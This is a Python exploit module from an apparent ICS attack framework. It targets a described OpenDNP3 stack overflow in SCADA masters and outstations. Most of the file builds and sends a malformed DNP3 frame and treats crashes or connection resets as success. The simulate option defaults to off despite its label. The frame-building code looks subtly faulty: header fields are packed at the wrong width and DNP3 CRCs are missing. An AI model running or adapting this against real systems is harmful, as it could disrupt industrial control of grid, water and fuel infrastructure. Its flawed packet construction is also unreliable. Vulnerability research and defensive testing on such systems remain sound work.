"""IndustrialXPL CVE Module — CVE-2024-38480 (OpenDNP3 Stack Buffer Overflow).

Stack buffer overflow in OpenDNP3 library (< 3.1.3) when parsing malformed
DNP3 Application Layer PDUs. An attacker on the same network segment can
send a crafted DNP3 packet that overflows a fixed-size stack buffer in the
DNP3 frame parser, leading to arbitrary code execution on systems running
OpenDNP3-based SCADA masters or outstations. CVSS 9.8.
"""
import socket
import struct

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "CVE-2024-38480 — OpenDNP3 Stack Buffer Overflow",
        "description":      "Stack buffer overflow in OpenDNP3 <3.1.3 via malformed DNP3 Application PDU. Affects SCADA masters and outstations using OpenDNP3. CVSS 9.8.",
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://nvd.nist.gov/vuln/detail/CVE-2024-38480",
            "https://github.com/dnp3/opendnp3",
            "https://www.cisa.gov/ics-advisories/",
        ),
        "devices":          (
            "Any system using OpenDNP3 library < 3.1.3",
            "SCADA masters, DNP3 outstations, RTUs using OpenDNP3",
        ),
        "cve":              "CVE-2024-38480",
        "cvss":             "9.8",
        "severity":         "CRITICAL",
        "mitre_techniques": ["T1190", "T0855", "T0882"],
        "mitre_tactics":    ["Initial Access", "Inhibit Response Function"],
    }

    target      = OptIP("",     "Target DNP3 master/outstation IP")
    port        = OptPort(20000,"DNP3 TCP port (default 20000)")
    simulate    = OptBool(False, "Simulate (default: True)")
    destructive = OptBool(False, "Enable live exploitation")

    def _build_dnp3_overflow(self) -> bytes:
        """Build malformed DNP3 frame with oversized Application Layer data."""
        # DNP3 Data Link Layer header: Start (0x0564), Length, Control, Dst, Src, CRC
        dst_addr = 1       # outstation address
        src_addr = 3       # master address

        # Application Layer: oversized object header (triggers stack overflow)
        # Object Group 12 (CROB) with malformed length field
        app_layer = bytes([
            0xC0, 0x01,        # FIR/FIN, func code 0x01 (READ)
            0x0C, 0x01,        # Object group 12, variation 1 (CROB)
            0x28,              # Qualifier: 8-bit count + 8-bit index
            0xFF,              # Count = 255 (oversized)
        ]) + b"\x00" * 1024   # padding triggers stack overflow

        # DNP3 transport layer header
        transport = bytes([0xC0]) + app_layer

        # DNP3 data link layer
        dl_length = 5 + len(transport)
        dl_ctrl = 0x44       # PRM=1, FCB=0, FCV=0, FC=4 (UNCONFIRMED_USER_DATA)
        dl_header = struct.pack("<BBHH",
            0x05, 0x64,       # Start bytes
            dl_length & 0xFF, # Length
            dl_ctrl,          # Control
        ) + struct.pack("<HH", dst_addr, src_addr)

        return dl_header + transport

    @mute
    def check(self):
        if not self.target:
            return False
        try:
            s = socket.create_connection((self.target, self.port), timeout=5)
            # Send a minimal valid DNP3 frame to probe
            probe = bytes([0x05, 0x64, 0x05, 0x44, 0x01, 0x00, 0x03, 0x00, 0x49, 0x21])
            s.sendall(probe)
            resp = s.recv(32)
            s.close()
            return resp[:2] == bytes([0x05, 0x64])  # DNP3 start bytes
        except Exception:
            return False

    def run(self):
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2024-38480 — OpenDNP3 Stack Buffer Overflow\n"
                    "CVSS 9.8 | Port 20000/TCP | OpenDNP3 < 3.1.3\n\n"
                    "Step 1: TCP connect to DNP3 port (default 20000)\n"
                    "Step 2: Send malformed DNP3 Application Layer PDU:\n"
                    "        - Object Group 12 (CROB), variation 1\n"
                    "        - Qualifier 0x28 with count=255 (oversized)\n"
                    "        - 1024 bytes padding after object header\n"
                    "Step 3: OpenDNP3 parser copies data to fixed-size stack\n"
                    "        buffer without bounds check → stack overflow\n"
                    "Step 4: Overwrite return address → arbitrary code execution\n\n"
                    "Affected: all SCADA masters/outstations using OpenDNP3\n"
                    "Critical: RTUs controlling grid, water, oil & gas"
                ),
                mitre_techniques=["T1190", "T0855", "T0882"],
            )
            return

        print_status(f"[CVE-2024-38480] Targeting OpenDNP3 at {self.target}:{self.port} ...")
        try:
            s = socket.create_connection((self.target, self.port), timeout=10)
            payload = self._build_dnp3_overflow()
            print_status(f"[CVE-2024-38480] Sending malformed DNP3 frame ({len(payload)} bytes) ...")
            s.sendall(payload)
            try:
                resp = s.recv(64)
                s.close()
                if not resp:
                    print_success("[CVE-2024-38480] Empty response — server may have crashed!")
                else:
                    print_info(f"[CVE-2024-38480] Response received ({len(resp)} bytes) — may be patched")
            except ConnectionResetError:
                print_success("[CVE-2024-38480] Connection reset — stack overflow triggered!")
            except socket.timeout:
                print_success("[CVE-2024-38480] Timeout after payload — crash likely!")
        except Exception as e:
            print_error(f"[CVE-2024-38480] {e}")
